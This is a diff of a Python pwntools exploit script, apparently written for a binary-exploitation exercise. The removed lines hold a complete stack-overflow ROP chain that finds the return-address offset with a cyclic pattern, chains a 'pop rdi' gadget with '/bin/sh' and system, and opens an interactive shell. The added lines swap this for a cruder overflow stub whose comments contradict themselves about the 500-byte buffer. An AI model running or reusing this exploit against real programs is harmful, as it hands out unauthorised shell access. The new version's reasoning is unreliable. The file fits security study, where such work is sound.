@@ -1,52 +1,18 @@
 from pwn import *
-def find_offset():
-    # Start the process
-    p = process('./vuln_binary')
-    
-    # Generate a pattern to find the offset
-    pattern = cyclic(1024)
-    
-    # Send the pattern
-    p.sendline(pattern)
-    
-    # Wait for the process to crash
-    p.wait()
-    
-    # Get the core dump
-    core = p.corefile
-    
-    # Find the offset
-    offset = cyclic_find(core.read(core.rsp, 4))
-    
-    # Return the offset
-    return offset
+context.binary = './binary_name'  # Replace with the actual binary name
 
+# Establish a process or network connection to the target binary
+# Uncomment the appropriate line depending on whether you are running locally or remotely
+target = process('./binary_name')  # For local testing
+# target = remote('example.com', 1234)  # For remote exploitation
 
-# Find the offset to the saved return address
-offset = find_offset()
-log.info(f'Offset to saved return address: {offset}')
+# Create a payload with a length that will overflow the passwd_buf
+# The buffer is 500 bytes, but the check only allows up to 8 characters
+# We will send exactly 8 characters plus some additional data to overflow
+payload = b'A' * 8 + b'B' * 100  # Adjust the second multiplier as needed
 
+# Send the crafted payload
+target.sendline(payload)
 
-# Define the target binary
-binary = ELF('./vuln_binary')
-
-# Find a gadget to pop a shell
-rop = ROP(binary)
-pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
-bin_sh = next(binary.search(b'/bin/sh'))
-system = binary.symbols['system']
-
-# Craft the payload
-payload = b'A' * offset
-payload += p64(pop_rdi)
-payload += p64(bin_sh)
-payload += p64(system)
-
-# Start the process
-p = process('./vuln_binary')
-
-# Send the payload
-p.sendline(payload)
-
-# Interact with the shell
-p.interactive()
+# Interact with the process if necessary
+target.interactive()
